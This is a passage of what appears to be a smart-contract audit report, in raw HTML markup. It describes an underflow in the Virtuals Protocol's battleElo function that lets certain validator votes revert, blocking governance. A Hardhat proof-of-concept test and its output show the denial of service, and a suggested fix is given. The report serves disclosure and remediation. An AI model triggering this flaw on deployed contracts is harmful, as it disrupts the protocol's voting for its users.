class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentRating\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//@audit Potential underflow here\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/EloCalculator.sol#L54\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/EloCalculator.sol#L54\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eWhen calculating results of a series of battle, battleElo will subtract \u003ccode\u003ecurrentRating\u003c/code\u003e by the difference in rate change. \u003ccode\u003ecurrentRating + eloA - 1000\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eUnder current AgentDao implementation in \u003ccode\u003e_castVote\u003c/code\u003e → \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L139\"\u003e\u003ccode\u003e_updateMaturity\u003c/code\u003e\u003c/a\u003e → \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L189\"\u003e\u003ccode\u003e_calcMaturity\u003c/code\u003e\u003c/a\u003e, \u003ccode\u003euint8[] memory battles\u003c/code\u003e can result in a negative change to the \u003ccode\u003ecurrentRating\u003c/code\u003e. This case is allowed in the protocol because we see \u003ccode\u003eServiceNft\u003c/code\u003e handles the case when \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L94-L96\"\u003e\u003ccode\u003e_maturities[proposalId] \u0026#x3C; _maturities[prevServiceId]\u003c/code\u003e\u003c/a\u003e in \u003ccode\u003eupdateImpact\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eWhen a validator casts a vote that results in a negative change in currentRating, this might cause \u003ccode\u003ecurrentRating + eloA - 1000\u003c/code\u003e underflow revert when \u003ccode\u003ecurrentRating\u003c/code\u003e is already low.\u003c/p\u003e\n\u003ch3 id=\"impact-15\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-15\" aria-label=\"impact 15 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eDOS conditions:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eValidators may be unable to submit valid votes with specific battle results.\u003c/li\u003e\n\u003cli\u003eThe governance mechanism may be partially blocked for low-maturity services.\u003c/li\u003e\n\u003cli\u003eThe voting process could be disrupted when trying to express certain opinions.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIn \u003ccode\u003ebattleElo\u003c/code\u003e, consider checking and handling \u003ccode\u003ecurrentRating + eloA - 1000\u003c/code\u003e underflow case and return a minimal rating value when the underflow case is triggered.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-15\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eTest logics:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eBase proposal: \u003ccode\u003eproposal1\u003c/code\u003e executed.\u003c/li\u003e\n\u003cli\u003eCheck \u003ccode\u003eproposal1\u003c/code\u003e’s maturity.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003evalidatorA\u003c/code\u003e’s voting power is twice as \u003ccode\u003evalidatorB\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eproposal2\u003c/code\u003e is created (intended as an upgrade from \u003ccode\u003eproposal1\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003evalidatorA\u003c/code\u003e cast a Vote with [0, 0, 0, 0, 0, 0, 1, 0, 1, 0].\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecastVote\u003c/code\u003e revert due to underflow. \u003ccode\u003ecastVote\u003c/code\u003e with specific results DOSsed.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eAdded unit test \u003ccode\u003eunderflow DOS certain voting\u003c/code\u003e in \u003ccode\u003etest/rewardsV2.js\u003c/code\u003e. Run test with: \u003ccode\u003enpx hardhat test test/rewardsV2.js\u003c/code\u003e:\u003c/p\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"107\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eit.only(\u0026quot;underflow DOS certain voting\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    //setup:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 1. base proposal: proposal1 executed\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 2. check proposal1\u0026#39;s maturity\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 3. validatorA\u0026#39;s voting power is twice as validatorB.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 4. proposal2 is created (intended as an upgrade from proposal1)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 5. validatorA cast a Vote with [0, 0, 0, 0, 0, 0, 1, 0, 1, 0]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 6. castVote revert due to underflow. castVote with specific results DOSsed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await loadFixture(deployWithAgent);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { serviceNft, contributionNft, agentNft, virtualToken } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      founder,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      contributor1,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      contributor2,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      validator1,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      validator2,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      trader,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setup LP and voting power\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;AgentToken\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      base.agent.token\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const veToken = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;AgentVeToken\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      base.agent.veToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const lp = await ethers.getContractAt(\u0026quot;IERC20\u0026quot;, base.agent.lp);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Delegate founder\u0026#39;s votes to validator1 (founder holds a large amount of tokens)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await veToken.connect(founder).delegate(validator1.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Set up validator2 with LP tokens - similar to the validator uptime test\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const router = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;IUniswapV2Router02\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.UNISWAP_ROUTER\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Verify voting power\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const daoAddr = (await agentNft.virtualInfo(1)).dao;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentDAO = await ethers.getContractAt(\u0026quot;AgentDAO\u0026quot;, daoAddr);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const validator1Votes = await veToken.getVotes(validator1.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Validator1 votes:\u0026quot;, formatEther(validator1Votes));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 1: Create base proposal and get it executed\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const proposalId1 = await createContribution(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1, // virtualId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // coreId (Cognitive Core)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // parentId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      true, // isModel\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // no dataset dependency\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Base contribution\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      base,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      contributor1.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [validator1], // Only validator1 votes on this one\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 2: Check proposalId1\u0026#39;s maturity\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const maturity1 = await serviceNft.getMaturity(proposalId1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Base proposal maturity:\u0026quot;, maturity1.toString());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(maturity1).to.be.gt(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 3: Create proposal2 (intended as an upgrade)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const descHash2 = getDescHash(\u0026quot;Improved contribution\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const mintCalldata2 = await getMintServiceCalldata(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      serviceNft,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      descHash2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentDAO.propose(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [serviceNft.target],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [0],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [mintCalldata2],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;Improved contribution\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Get the proposalId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const events = await agentDAO.queryFilter(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      agentDAO.filters.ProposalCreated,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      -1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const proposalId2 = events[events.length - 1].args[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Create contribution NFT\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await contributionNft.mint(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      contributor2.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1, // virtualId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // coreId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      TOKEN_URI,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      proposalId2,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // parentId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      true, // isModel\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0 // no datasetId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Step 4: Validator1 casts honest forVote with battles results\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const honestVoteParams = abi.encode(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u0026quot;uint8[] memory\u0026quot;],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [[0, 0, 0, 0, 0, 0, 1, 0, 1, 0]]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await expect(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      agentDAO\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .connect(validator1)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        .castVoteWithReasonAndParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e          proposalId2,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e          1,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e          \u0026quot;Good improvement\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e          honestVoteParams\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        )\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ).to.be.revertedWithPanic(0x11);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;validator1 vote for proposal2 reverted with 0x11 underflow panic code\u0026quot;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003cp\u003eTest results:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"108\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  RewardsV2\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eValidator1 votes: 9999999.999999999999999\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eBase proposal maturity: 100\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003evalidator1 vote for proposal2 reverted with 0x11 underflow panic code\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ✔ underflow DOS certain voting (1540ms)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e1 passing (2s)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-22-founder-has-to-double-stake-during-migration-with-the-initial-lp-locked-in-the-old-vetoken\" style=\"position:relative;\"\u003e\u003ca href=\"#m-22-founder-has-to-double-stake-during-migration-with-the-initial-lp-locked-in-the-old-vetoken\" aria-label=\"m 22 founder has to double stake during migration with the initial lp locked in the old vetoken permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 